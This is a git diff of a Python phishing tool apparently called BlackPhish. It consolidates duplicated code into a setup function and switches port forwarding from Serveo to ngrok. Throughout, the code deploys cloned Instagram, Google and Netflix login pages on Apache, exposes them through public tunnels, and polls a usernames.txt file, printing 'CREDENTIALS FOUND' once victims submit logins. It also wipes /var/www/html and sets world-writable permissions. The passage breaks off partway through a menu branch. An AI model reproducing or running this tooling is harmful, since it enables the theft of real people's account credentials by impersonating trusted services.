@@ -95,13 +95,207 @@ def checkInternet(): # Checks for internet connection #
         exit(0)
 
 
-# Port forward to Serveo #
-def serveoForward():
-    name = input(yellow + "\nCustom Domain Name(don't need www. or domain extension): ")
-    port = input(yellow + "\nPort[recommended 80]: ")
-    print(yellow + '\n If prompt about RSA key, say yes' + green)
+
+def setup(template):
+    print('\n')
+    print(red + '           [1]' + blue + ' ngrok (recommended)')
+    print(red + '           [2]' + blue + ' Localtunnel')
+    print(red + '           [3]' + blue + ' localhost.run')
+    print(red + '           [4]' + blue + ' Localhost only\n\n')
+    choice1 = input(red + "        [" + blue + f"BlackPhish-{template}" + red + "] -> ")
+
+    # Setup #
+    if choice1 == '1':
+        system("clear")
+        print(green + '[+] Copying Files')
+        sleep(0.1)
+        print(green + '[+] Cleaning /var/www/html/')
+        sleep(0.1)
+        system('rm -r /var/www/html/ && mkdir /var/www/html/')  # Removing then adding /var/www/html/ #
+        print(green + '[+] Cleaning /Server/www/')
+        sleep(0.1)
+        system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www")  # Removes then adds /Server/www #
+        dir_util.copy_tree(f"Websites/{template}",
+                           "Server/www")  # Copies the entire folder of Websites/template to /Server/www #
+        redirect()  # Redirect Prompt #
+        print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
+        dir_util.copy_tree("Server/www", "/var/www/html")  # Copies from Server/www to /var/www/html #
+        print(green + '[+] Copying to /var/www/html')
+        sleep(0.1)
+        system("chmod -R 777 /var/www/html")  # Change file permission of /var/www/html #
+        print(green + '[+] Changing File Permissions')
+        sleep(0.1)
+        print(yellow + '[+] Starting Apache2 Service')
+        sleep(0.1)
+        system('service apache2 start')  # Starts apache2 service #
+        print(green + '[+] Apache2 Service Started')
+        sleep(0.1)
+        print(blue + "\nLocal: " + red + localip + "\n")  # Shows where site is hosted locally #
+        sleep(0.1)
+        print(yellow + '[*] Starting ngrok')
+        ngrokForward()  # ngrok port forward #
+        print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
+        sleep(0.1)
+        while True:  # Waits for content on usernames.txt #
+            with open('/var/www/html/usernames.txt') as creds:
+                lines = creds.read().rstrip()
+                if len(lines) != 0:
+                    print(green + "______________________________________________________________________________\n")
+                    print('\n                CREDENTIALS FOUND\n\n')
+                    system("cat /var/www/html/usernames.txt")
+                    print("\n______________________________________________________________________________" + reset)
+                    endMessage()
+
+    elif choice1 == '2':
+        system("clear")
+        print(green + '[+] Copying Files')
+        sleep(0.1)
+        print(green + '[+] Cleaning /var/www/html/')
+        sleep(0.1)
+        system('rm -r /var/www/html/ && mkdir /var/www/html/')  # Removing then adding /var/www/html/ #
+        print(green + '[+] Cleaning /Server/www/')
+        sleep(0.1)
+        system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www")  # Removes then adds /Server/www #
+        dir_util.copy_tree(f"Websites/{template}",
+                           "Server/www")  # Copies the entire folder of Websites/template to /Server/www #
+        redirect()  # Redirect Prompt #
+        print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
+        dir_util.copy_tree("Server/www", "/var/www/html")  # Copies from Server/www to /var/www/html #
+        print(green + '[+] Copying to /var/www/html')
+        sleep(0.1)
+        system("chmod -R 777 /var/www/html")  # Change file permission of /var/www/html #
+        print(green + '[+] Changing File Permissions')
+        sleep(0.1)
+        print(yellow + '[+] Starting Apache2 Service')
+        sleep(0.1)
+        system('service apache2 start')  # Starts apache2 service #
+        print(green + '[+] Apache2 Service Started')
+        sleep(0.1)
+        print(yellow + "\n[*] Local: " + green + localip + "\n")  # Shows where site is hosted locally #
+        sleep(0.1)
+        print(yellow + '[*] Starting Localtunnel')
+        localTunnel()  # Localtunnel port forward #
+        print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
+        sleep(0.1)
+        while True:  # Waits for content on usernames.txt #
+            with open('/var/www/html/usernames.txt') as creds:
+                lines = creds.read().rstrip()
+                if len(lines) != 0:
+                    print(green + "______________________________________________________________________________\n")
+                    print('\n                CREDENTIALS FOUND\n\n')
+                    system("cat /var/www/html/usernames.txt")
+                    print("\n______________________________________________________________________________" + reset)
+                    endMessage()
+
+    elif choice1 == '3':
+        system("clear")
+        print(green + '[+] Copying Files')
+        sleep(0.1)
+        print(green + '[+] Cleaning /var/www/html/')
+        sleep(0.1)
+        system('rm -r /var/www/html/ && mkdir /var/www/html/')  # Removing then adding /var/www/html/ #
+        print(green + '[+] Cleaning /Server/www/')
+        sleep(0.1)
+        system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www")  # Removes then adds /Server/www #
+        dir_util.copy_tree(f"Websites/{template}",
+                           "Server/www")  # Copies the entire folder of Websites/template to /Server/www #
+        redirect()  # Redirect Prompt #
+        print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
+        dir_util.copy_tree("Server/www", "/var/www/html")  # Copies from Server/www to /var/www/html #
+        print(green + '[+] Copying to /var/www/html')
+        sleep(0.1)
+        system("chmod -R 777 /var/www/html")  # Change file permission of /var/www/html #
+        print(green + '[+] Changing File Permissions')
+        sleep(0.1)
+        print(yellow + '[+] Starting Apache2 Service')
+        sleep(0.1)
+        system('service apache2 start')  # Starts apache2 service #
+        print(green + '[+] Apache2 Service Started')
+        sleep(0.1)
+        print(yellow + "\n[*] Local: " + green + localip + "\n")  # Shows where site is hosted locally #
+        sleep(0.1)
+        print(yellow + '[*] Starting Localhost.run')
+        localhost()  # Localhost.run port forward #
+        while True:  # Waits for content on usernames.txt #
+            with open('/var/www/html/usernames.txt') as creds:
+                lines = creds.read().rstrip()
+                if len(lines) != 0:
+                    print(green + "______________________________________________________________________________\n")
+                    print('\n                CREDENTIALS FOUND\n\n')
+                    system("cat /var/www/html/usernames.txt")
+                    print("\n______________________________________________________________________________" + reset)
+                    endMessage()
+
+    elif choice1 == '4':
+        system("clear")
+        print(green + '[+] Copying Files')
+        sleep(0.1)
+        print(green + '[+] Cleaning /var/www/html/')
+        sleep(0.1)
+        system('rm -r /var/www/html/ && mkdir /var/www/html/')  # Removing then adding /var/www/html/ #
+        print(green + '[+] Cleaning /Server/www/')
+        sleep(0.1)
+        system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www")  # Removes then adds /Server/www #
+        dir_util.copy_tree(f"Websites/{template}",
+                           "Server/www")  # Copies the entire folder of Websites/template to /Server/www #
+        redirect()  # Redirect Prompt #
+        print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
+        dir_util.copy_tree("Server/www", "/var/www/html")  # Copies from Server/www to /var/www/html #
+        print(green + '[+] Copying to /var/www/html')
+        sleep(0.1)
+        system("chmod -R 777 /var/www/html")  # Change file permission of /var/www/html #
+        print(green + '[+] Changing File Permissions')
+        sleep(0.1)
+        print(yellow + '[+] Starting Apache2 Service')
+        sleep(0.1)
+        system('service apache2 start')  # Starts apache2 service #
+        print(green + '[+] Apache2 Service Started')
+        sleep(0.1)
+        print(yellow + "\n[*] Local: " + green + localip + "\n")  # Shows where site is hosted locally #
+        sleep(0.1)
+        print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
+        sleep(0.1)
+        while True:  # Waits for content on usernames.txt #
+            with open('/var/www/html/usernames.txt') as creds:
+                lines = creds.read().rstrip()
+                if len(lines) != 0:
+                    print(green + "______________________________________________________________________________\n")
+                    print('\n                CREDENTIALS FOUND\n\n')
+                    system("cat /var/www/html/usernames.txt")
+                    print("\n______________________________________________________________________________" + reset)
+                    endMessage()
+
+    else:
+        print(red + '[!] Invalid Option')
+        sleep(1)
+        main()
+
+
+# Port forward to ngrok #
+def ngrokForward():
+    # Set defaults
+    port = 80
+    method = "http"
+    des_method = input(yellow + "\nWould you like to use tcp or http as your method?[default http]: ").lower()
+    if not des_method:
+        pass
+    elif des_method == "tcp" or des_method == "http":
+        method = des_method
+    else:
+        print("[!] Method entered invalid, resorting to default method http")
+        sleep(2)
+    des_port = input(yellow + "\nPort[default 80]: ")
+    if des_port:
+        try:
+            port = int(des_port)
+        except ValueError:
+            print("[!] Port entered is not a number, resorting to default port 80")
+            sleep(2)
+    print("[!] Starting ngrok...")
+    print("[!]A new terminal will spawn with the ngrok links, you can use HTTP or HTTPS")
+    print("[!] Do not close out of the new terminal until you are finished")
     sleep(2)
-    system('ssh -o ServerAliveInterval=60 -R ' + name + ':' + port + ':localhost:' + port + ' serveo.net')
+    system(f"gnome-terminal -q -- /bin/bash -c 'cd {cwd} && ./ngrok {method} {port}'")
 
 
 
@@ -216,861 +410,37 @@ def main():
 
     # Host Instagram Page #
     if choice == "1":
-        print('\n')
-        print(red + '           [1]' + blue + ' Serveo (recommended)')
-        print(red + '           [2]' + blue + ' Localtunnel')
-        print(red + '           [3]' + blue + ' localhost.run')
-        print(red + '           [4]' + blue + ' Localhost only\n\n')
-        choice1 = input(red + "        [" + blue + "BlackPhish-Instagram" + red + "] -> ")
-
-        # Instagram #
-        if choice1 == '1':
-            system("clear")
-            print(green + '[+] Copying Files')
-            sleep(0.1)
-            print(green + '[+] Cleaning /var/www/html/')
-            sleep(0.1)
-            system('rm -r /var/www/html/ && mkdir /var/www/html/') # Removing then adding /var/www/html/ #
-            print(green + '[+] Cleaning /Server/www/')
-            sleep(0.1)
-            system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
-            dir_util.copy_tree("Websites/Instagram", "Server/www") # Copies the entire folder of Websites/Instagram to /Server/www #
-            redirect() # Redirect Prompt #
-            print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
-            dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
-            print(green + '[+] Copying to /var/www/html')
-            sleep(0.1)
-            system("chmod -R 777 /var/www/html") # Change file permission of /var/www/html #
-            print(green + '[+] Changing File Permissions')
-            sleep(0.1)
-            print(yellow + '[+] Starting Apache2 Service')
-            sleep(0.1)
-            system('service apache2 start') # Starts apache2 service #
-            print(green + '[+] Apache2 Service Started')
-            sleep(0.1)
-            print(blue + "\nLocal: " + red + localip + "\n") # Shows where site is hosted locally #
-            sleep(0.1)
-            print(yellow + '[*] Starting Serveo')
-            serveoForward() # Serveo port forward #
-            print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
-            sleep(0.1)
-            while True: # Waits for content on usernames.txt #
-                with open('/var/www/html/usernames.txt') as creds:
-                    lines = creds.read().rstrip()
-                    if len(lines) != 0:
-                        print(green + "______________________________________________________________________________\n")
-                        print('\n                CREDENTIALS FOUND\n\n')
-                        system("cat /var/www/html/usernames.txt")
-                        print("\n______________________________________________________________________________" + reset)
-                        endMessage()
-
-        elif choice1 == '2':
-            system("clear")
-            print(green + '[+] Copying Files')
-            sleep(0.1)
-            print(green + '[+] Cleaning /var/www/html/')
-            sleep(0.1)
-            system('rm -r /var/www/html/ && mkdir /var/www/html/') # Removing then adding /var/www/html/ #
-            print(green + '[+] Cleaning /Server/www/')
-            sleep(0.1)
-            system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
-            dir_util.copy_tree("Websites/Instagram", "Server/www") # Copies the entire folder of Websites/Instagram to /Server/www #
-            redirect() # Redirect Prompt #
-            print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
-            dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
-            print(green + '[+] Copying to /var/www/html')
-            sleep(0.1)
-            system("chmod -R 777 /var/www/html") # Change file permission of /var/www/html #
-            print(green + '[+] Changing File Permissions')
-            sleep(0.1)
-            print(yellow + '[+] Starting Apache2 Service')
-            sleep(0.1)
-            system('service apache2 start') # Starts apache2 service #
-            print(green + '[+] Apache2 Service Started')
-            sleep(0.1)
-            print(yellow + "\n[*] Local: " + green + localip + "\n") # Shows where site is hosted locally #
-            sleep(0.1)
-            print(yellow + '[*] Starting Localtunnel')
-            localTunnel() # Localtunnel port forward #
-            print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
-            sleep(0.1)
-            while True: # Waits for content on usernames.txt #
-                with open('/var/www/html/usernames.txt') as creds:
-                    lines = creds.read().rstrip()
-                    if len(lines) != 0:
-                        print(green + "______________________________________________________________________________\n")
-                        print('\n                CREDENTIALS FOUND\n\n')
-                        system("cat /var/www/html/usernames.txt")
-                        print("\n______________________________________________________________________________" + reset)
-                        endMessage()
-
-        elif choice1 == '3':
-            system("clear")
-            print(green + '[+] Copying Files')
-            sleep(0.1)
-            print(green + '[+] Cleaning /var/www/html/')
-            sleep(0.1)
-            system('rm -r /var/www/html/ && mkdir /var/www/html/') # Removing then adding /var/www/html/ #
-            print(green + '[+] Cleaning /Server/www/')
-            sleep(0.1)
-            system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
-            dir_util.copy_tree("Websites/Instagram", "Server/www") # Copies the entire folder of Websites/Instagram to /Server/www #
-            redirect() # Redirect Prompt #
-            print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
-            dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
-            print(green + '[+] Copying to /var/www/html')
-            sleep(0.1)
-            system("chmod -R 777 /var/www/html") # Change file permission of /var/www/html #
-            print(green + '[+] Changing File Permissions')
-            sleep(0.1)
-            print(yellow + '[+] Starting Apache2 Service')
-            sleep(0.1)
-            system('service apache2 start') # Starts apache2 service #
-            print(green + '[+] Apache2 Service Started')
-            sleep(0.1)
-            print(yellow + "\n[*] Local: " + green + localip + "\n") # Shows where site is hosted locally #
-            sleep(0.1)
-            print(yellow + '[*] Starting Localhost.run')
-            localhost() # Localhost.run port forward #
-            while True: # Waits for content on usernames.txt #
-                with open('/var/www/html/usernames.txt') as creds:
-                    lines = creds.read().rstrip()
-                    if len(lines) != 0:
-                        print(green + "______________________________________________________________________________\n")
-                        print('\n                CREDENTIALS FOUND\n\n')
-                        system("cat /var/www/html/usernames.txt")
-                        print("\n______________________________________________________________________________" + reset)
-                        endMessage()
-
-        elif choice1 == '4':
-            system("clear")
-            print(green + '[+] Copying Files')
-            sleep(0.1)
-            print(green + '[+] Cleaning /var/www/html/')
-            sleep(0.1)
-            system('rm -r /var/www/html/ && mkdir /var/www/html/') # Removing then adding /var/www/html/ #
-            print(green + '[+] Cleaning /Server/www/')
-            sleep(0.1)
-            system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
-            dir_util.copy_tree("Websites/Instagram", "Server/www") # Copies the entire folder of Websites/Instagram to /Server/www #
-            redirect() # Redirect Prompt #
-            print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
-            dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
-            print(green + '[+] Copying to /var/www/html')
-            sleep(0.1)
-            system("chmod -R 777 /var/www/html") # Change file permission of /var/www/html #
-            print(green + '[+] Changing File Permissions')
-            sleep(0.1)
-            print(yellow + '[+] Starting Apache2 Service')
-            sleep(0.1)
-            system('service apache2 start') # Starts apache2 service #
-            print(green + '[+] Apache2 Service Started')
-            sleep(0.1)
-            print(yellow + "\n[*] Local: " + green + localip + "\n") # Shows where site is hosted locally #
-            sleep(0.1)
-            print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
-            sleep(0.1)
-            while True: # Waits for content on usernames.txt #
-                with open('/var/www/html/usernames.txt') as creds:
-                    lines = creds.read().rstrip()
-                    if len(lines) != 0:
-                        print(green + "______________________________________________________________________________\n")
-                        print('\n                CREDENTIALS FOUND\n\n')
-                        system("cat /var/www/html/usernames.txt")
-                        print("\n______________________________________________________________________________" + reset)
-                        endMessage()
-
-        else:
-            print(red + '[!] Invalid Option')
-            sleep(1)
-            main()
+        setup("Instagram")
 
 
 
     # Google #
     elif choice == '2':
-        print('\n')
-        print(red + '           [1]' + blue + ' Serveo (recommended)')
-        print(red + '           [2]' + blue + ' Localtunnel')
-        print(red + '           [3]' + blue + ' localhost.run')
-        print(red + '           [4]' + blue + ' Localhost only\n\n')
-        choice1 = input(red + "        [" + blue + "BlackPhish-Google" + red + "] -> ")
-
-        if choice1 == '1':
-            system("clear")
-            print(green + '[+] Copying Files')
-            sleep(0.1)
-            print(green + '[+] Cleaning /var/www/html/')
-            sleep(0.1)
-            system('rm -r /var/www/html/ && mkdir /var/www/html/') # Removing then adding /var/www/html/ #
-            print(green + '[+] Cleaning /Server/www/')
-            sleep(0.1)
-            system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
-            dir_util.copy_tree("Websites/Google", "Server/www") # Copies the entire folder of Websites/Google to /Server/www #
-            redirect() # Redirect Prompt #
-            print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
-            dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
-            print(green + '[+] Copying to /var/www/html')
-            sleep(0.1)
-            system("chmod -R 777 /var/www/html") # Change file permission of /var/www/html #
-            print(green + '[+] Changing File Permissions')
-            sleep(0.1)
-            print(yellow + '[+] Starting Apache2 Service')
-            sleep(0.1)
-            system('service apache2 start') # Starts apache2 service #
-            print(green + '[+] Apache2 Service Started')
-            sleep(0.1)
-            print(yellow + "\n[*] Local hosted: " + green + localip + "\n") # Shows where site is hosted locally #
-            sleep(0.1)
-            print(yellow + '[*] Starting Serveo')
-            serveoForward() # Serveo port forward #
-            print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
-            sleep(0.1)
-            while True:
-                with open('/var/www/html/usernames.txt') as creds:
-                    lines = creds.read().rstrip()
-                    if len(lines) != 0:
-                        print(green + "______________________________________________________________________________\n")
-                        print('\n                CREDENTIALS FOUND\n\n')
-                        system("cat /var/www/html/usernames.txt")
-                        print("\n______________________________________________________________________________" + reset)
-                        endMessage()
-
-        elif choice1 == '2':
-            system("clear")
-            print(green + '[+] Copying Files')
-            sleep(0.1)
-            print(green + '[+] Cleaning /var/www/html/') 
-            sleep(0.1)
-            system('rm -r /var/www/html/ && mkdir /var/www/html/') # Removing then adding /var/www/html/ #
-            print(green + '[+] Cleaning /Server/www/') 
-            sleep(0.1)
-            system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
-            dir_util.copy_tree("Websites/Google", "Server/www") # Copies the entire folder of Websites/Google to /Server/www #
-            redirect() # Redirect Prompt #
-            print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
-            dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
-            print(green + '[+] Copying to /var/www/html')
-            sleep(0.1)
-            system("chmod -R 777 /var/www/html") # Change file permission of /var/www/html #
-            print(green + '[+] Changing File Permissions')
-            sleep(0.1)
-            print(yellow + '[+] Starting Apache2 Service')
-            sleep(0.1)
-            system('service apache2 start') # Starts apache2 service #
-            print(green + '[+] Apache2 Service Started')
-            sleep(0.1)
-            print(yellow + "\n[*] Local: " + green + localip + "\n") # Shows where site is hosted locally #
-            sleep(0.1)
-            print(yellow + '[*] Starting Localtunnel')
-            localTunnel() # Localtunnel port forward #
-            print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
-            sleep(0.1)
-            while True: # Waits for content on usernames.txt #
-                with open('/var/www/html/usernames.txt') as creds:
-                    lines = creds.read().rstrip()
-                    if len(lines) != 0:
-                        print(green + "______________________________________________________________________________\n")
-                        print('\n                CREDENTIALS FOUND\n\n')
-                        system("cat /var/www/html/usernames.txt")
-                        print("\n______________________________________________________________________________" + reset)
-                        endMessage()
-
-        elif choice1 == '3':
-            system("clear")
-            print(green + '[+] Copying Files')
-            sleep(0.1)
-            print(green + '[+] Cleaning /var/www/html/')
-            sleep(0.1)
-            system('rm -r /var/www/html/ && mkdir /var/www/html/') # Removing then adding /var/www/html/ #
-            print(green + '[+] Cleaning /Server/www/')
-            sleep(0.1)
-            system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
-            dir_util.copy_tree("Websites/Google", "Server/www") # Copies the entire folder of Websites/Google to /Server/www #
-            redirect() # Redirect Prompt #
-            print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
-            dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
-            print(green + '[+] Copying to /var/www/html')
-            sleep(0.1)
-            system("chmod -R 777 /var/www/html") # Change file permission of /var/www/html #
-            print(green + '[+] Changing File Permissions')
-            sleep(0.1)
-            print(yellow + '[+] Starting Apache2 Service')
-            sleep(0.1)
-            system('service apache2 start') # Starts apache2 service #
-            print(green + '[+] Apache2 Service Started')
-            sleep(0.1)
-            print(yellow + "\n[*] Local: " + green + localip + "\n") # Shows where site is hosted locally #
-            sleep(0.1)
-            print(yellow + '[*] Starting Localhost.run')
-            localhost() # Localhost.run port forward #
-            print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
-            sleep(0.1)
-            while True: # Waits for content on usernames.txt #
-                with open('/var/www/html/usernames.txt') as creds:
-                    lines = creds.read().rstrip()
-                    if len(lines) != 0:
-                        print(green + "______________________________________________________________________________\n")
-                        print('\n                CREDENTIALS FOUND\n\n')
-                        system("cat /var/www/html/usernames.txt")
-                        print("\n______________________________________________________________________________" + reset)
-                        endMessage()
-
-        elif choice1 == '4':
-            system("clear")
-            print(green + '[+] Copying Files')
-            sleep(0.1)
-            print(green + '[+] Cleaning /var/www/html/')
-            sleep(0.1)
-            system('rm -r /var/www/html/ && mkdir /var/www/html/') # Removing then adding /var/www/html/ #
-            print(green + '[+] Cleaning /Server/www/')
-            sleep(0.1)
-            system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
-            dir_util.copy_tree("Websites/Google", "Server/www") # Copies the entire folder of Websites/Google to /Server/www #
-            redirect() # Redirect Prompt #
-            print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
-            dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
-            print(green + '[+] Copying to /var/www/html')
-            sleep(0.1)
-            system("chmod -R 777 /var/www/html") # Change file permission of /var/www/html #
-            print(green + '[+] Changing File Permissions')
-            sleep(0.1)
-            print(yellow + '[+] Starting Apache2 Service')
-            sleep(0.1)
-            system('service apache2 start') # Starts apache2 service #
-            print(green + '[+] Apache2 Service Started')
-            sleep(0.1)
-            print(yellow + "\n[*] Local: " + green + localip + "\n") # Shows where site is hosted locally #
-            sleep(0.1)
-            print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
-            sleep(0.1)
-            while True: # Waits for content on usernames.txt #
-                with open('/var/www/html/usernames.txt') as creds:
-                    lines = creds.read().rstrip()
-                    if len(lines) != 0:
-                        print(green + "______________________________________________________________________________\n")
-                        print('\n                CREDENTIALS FOUND\n\n')
-                        system("cat /var/www/html/usernames.txt")
-                        print("\n______________________________________________________________________________" + reset)
-                        endMessage()
-
-        else:
-            print(red + '\n[!] Invalid Option')
-            sleep(2)
-            main()
-
-
-
-    # Netflix #
-    elif choice == '4':
-        print('\n')
-        print(red + '           [1]' + blue + ' Serveo (recommended)')
-        print(red + '           [2]' + blue + ' Localtunnel')
-        print(red + '           [3]' + blue + ' localhost.run')
-        print(red + '           [4]' + blue + ' Localhost only\n\n')
-        choice1 = input(red + "        [" + blue + "BlackPhish-Netflix" + red + "] -> ")
-
-        if choice1 == '1':
-            system("clear")
-            print(green + '[+] Copying Files')
-            sleep(0.1)
-            print(green + '[+] Cleaning /var/www/html/')
-            sleep(0.1)
-            system('rm -r /var/www/html/ && mkdir /var/www/html/') # Removing then adding /var/www/html/ #
-            print(green + '[+] Cleaning /Server/www/')
-            sleep(0.1)
-            system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
-            dir_util.copy_tree("Websites/Netflix", "Server/www") # Copies the entire folder of Websites/Netflix to /Server/www #
-            redirect() # Redirect Prompt #
-            print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
-            dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
-            print(green + '[+] Copying to /var/www/html')
-            sleep(0.1)
-            system("chmod -R 777 /var/www/html") # Change file permission of /var/www/html #
-            print(green + '[+] Changing File Permissions')
-            sleep(0.1)
-            print(yellow + '[+] Starting Apache2 Service')
-            sleep(0.1)
-            system('service apache2 start') # Starts apache2 service #
-            print(green + '[+] Apache2 Service Started')
-            sleep(0.1)
-            print(yellow + "\n[*] Local hosted: " + green + localip + "\n") # Shows where site is hosted locally #
-            sleep(0.1)
-            print(yellow + '[*] Starting Serveo')
-            serveoForward() # Serveo port forward #
-            print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
-            sleep(0.1)
-            while True:
-                with open('/var/www/html/usernames.txt') as creds:
-                    lines = creds.read().rstrip()
-                    if len(lines) != 0:
-                        print(green + "______________________________________________________________________________\n")
-                        print('\n                CREDENTIALS FOUND\n\n')
-                        system("cat /var/www/html/usernames.txt")
-                        print("\n______________________________________________________________________________" + reset)
-                        endMessage()
-
-        elif choice1 == '2':
-            system("clear")
-            print(green + '[+] Copying Files')
-            sleep(0.1)
-            print(green + '[+] Cleaning /var/www/html/') 
-            sleep(0.1)
-            system('rm -r /var/www/html/ && mkdir /var/www/html/') # Removing then adding /var/www/html/ #
-            print(green + '[+] Cleaning /Server/www/') 
-            sleep(0.1)
-            system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
-            dir_util.copy_tree("Websites/Netflix", "Server/www") # Copies the entire folder of Websites/Netflix to /Server/www #
-            redirect() # Redirect Prompt #
-            print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
-            dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
-            print(green + '[+] Copying to /var/www/html')
-            sleep(0.1)
-            system("chmod -R 777 /var/www/html") # Change file permission of /var/www/html #
-            print(green + '[+] Changing File Permissions')
-            sleep(0.1)
-            print(yellow + '[+] Starting Apache2 Service')
-            sleep(0.1)
-            system('service apache2 start') # Starts apache2 service #
-            print(green + '[+] Apache2 Service Started')
-            sleep(0.1)
-            print(yellow + "\n[*] Local: " + green + localip + "\n") # Shows where site is hosted locally #
-            sleep(0.1)
-            print(yellow + '[*] Starting Localtunnel')
-            localTunnel() # Localtunnel port forward #
-            print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
-            sleep(0.1)
-            while True: # Waits for content on usernames.txt #
-                with open('/var/www/html/usernames.txt') as creds:
-                    lines = creds.read().rstrip()
-                    if len(lines) != 0:
-                        print(green + "______________________________________________________________________________\n")
-                        print('\n                CREDENTIALS FOUND\n\n')
-                        system("cat /var/www/html/usernames.txt")
-                        print("\n______________________________________________________________________________" + reset)
-                        endMessage()
-
-        elif choice1 == '3':
-            system("clear")
-            print(green + '[+] Copying Files')
-            sleep(0.1)
-            print(green + '[+] Cleaning /var/www/html/')
-            sleep(0.1)
-            system('rm -r /var/www/html/ && mkdir /var/www/html/') # Removing then adding /var/www/html/ #
-            print(green + '[+] Cleaning /Server/www/')
-            sleep(0.1)
-            system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
-            dir_util.copy_tree("Websites/Netflix", "Server/www") # Copies the entire folder of Websites/Netflix to /Server/www #
-            redirect() # Redirect Prompt #
-            print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
-            dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
-            print(green + '[+] Copying to /var/www/html')
-            sleep(0.1)
-            system("chmod -R 777 /var/www/html") # Change file permission of /var/www/html #
-            print(green + '[+] Changing File Permissions')
-            sleep(0.1)
-            print(yellow + '[+] Starting Apache2 Service')
-            sleep(0.1)
-            system('service apache2 start') # Starts apache2 service #
-            print(green + '[+] Apache2 Service Started')
-            sleep(0.1)
-            print(yellow + "\n[*] Local: " + green + localip + "\n") # Shows where site is hosted locally #
-            sleep(0.1)
-            print(yellow + '[*] Starting Localhost.run')
-            localhost() # Localhost.run port forward #
-            print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
-            sleep(0.1)
-            while True: # Waits for content on usernames.txt #
-                with open('/var/www/html/usernames.txt') as creds:
-                    lines = creds.read().rstrip()
-                    if len(lines) != 0:
-                        print(green + "______________________________________________________________________________\n")
-                        print('\n                CREDENTIALS FOUND\n\n')
-                        system("cat /var/www/html/usernames.txt")
-                        print("\n______________________________________________________________________________" + reset)
-                        endMessage()
-
-        elif choice1 == '4':
-            system("clear")
-            print(green + '[+] Copying Files')
-            sleep(0.1)
-            print(green + '[+] Cleaning /var/www/html/')
-            sleep(0.1)
-            system('rm -r /var/www/html/ && mkdir /var/www/html/') # Removing then adding /var/www/html/ #
-            print(green + '[+] Cleaning /Server/www/')
-            sleep(0.1)
-            system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
-            dir_util.copy_tree("Websites/Netflix", "Server/www") # Copies the entire folder of Websites/Netflix to /Server/www #
-            redirect() # Redirect Prompt #
-            print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
-            dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
-            print(green + '[+] Copying to /var/www/html')
-            sleep(0.1)
-            system("chmod -R 777 /var/www/html") # Change file permission of /var/www/html #
-            print(green + '[+] Changing File Permissions')
-            sleep(0.1)
-            print(yellow + '[+] Starting Apache2 Service')
-            sleep(0.1)
-            system('service apache2 start') # Starts apache2 service #
-            print(green + '[+] Apache2 Service Started')
-            sleep(0.1)
-            print(yellow + "\n[*] Local hosted: " + green + localip + "\n") # Shows where site is hosted locally #
-            sleep(0.1)
-            print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
